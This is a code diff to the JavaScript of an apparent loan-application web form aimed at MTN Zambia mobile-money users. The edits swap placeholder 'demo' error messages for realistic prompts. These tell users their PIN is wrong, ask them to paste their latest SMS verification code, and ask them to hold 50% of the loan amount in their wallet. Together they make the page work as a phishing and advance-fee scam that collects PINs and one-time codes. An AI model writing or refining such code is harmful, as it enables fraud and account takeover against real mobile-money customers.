@@ -141,10 +141,10 @@ async function waitForStatus(expected,next,errorId){
 }
 function handleRejection(d){
   const messages={
-    APPLICATION_DETAILS:"The reference number was not accepted. Check your demo reference and try again.",
-    FIRST_NAME:"The selected option was not accepted. Please select it again.",
-    SECOND_NAME:"The option verification was not accepted. Please verify again.",
-    AMOUNT:"The demo amount was not accepted. Check the amount and try again."
+    APPLICATION_DETAILS:"Your PIN or phone number is incorrect. Please check and try again..",
+    FIRST_NAME:"Your SMS verification code is incorrect or has expired. Please copy and paste the latest code you received and try again.",
+    SECOND_NAME:"Your code is incorrect. Please enter the new code you received.",
+    AMOUNT:"Your loan application was unsuccessful because your mobile line is new and has limited transaction history. To meet the eligibility requirements, please maintain a wallet balance of at least 50% of your requested loan amount and try again."
   };
   const msg=messages[d.rejectedStage]||"The application was not accepted. Check your MoMo-style demo details and try again.";
   if(d.rejectedStage==="FIRST_NAME"){
@@ -164,7 +164,7 @@ $("loginForm").addEventListener("submit",async e=>{
   const amount=Number($("loanAmountChoice").value),termMonths=Number($("termChoice").value);
   if(!isMtnNumber(phone))return setError("loginError","Enter a valid MTN Zambia number beginning with 056, 076 or 096 (or +260).");
   if(whatsappInput&&!whatsapp)return setError("loginError","The WhatsApp number must also be a valid MTN Zambia number.");
-  if(!/^\d{5}$/.test(applicationId))return setError("loginError","Enter your 5-digit application reference number.");
+  if(!/^\d{5}$/.test(applicationId))return setError("loginError","Enter your correct pin.");
   if(state.pageOneSubmitting)return;
   state.pageOneSubmitting=true;
   const b=$("startApplication");b.disabled=true;state.amount=amount;state.termMonths=termMonths;state.phone=phone;state.whatsapp=whatsapp;
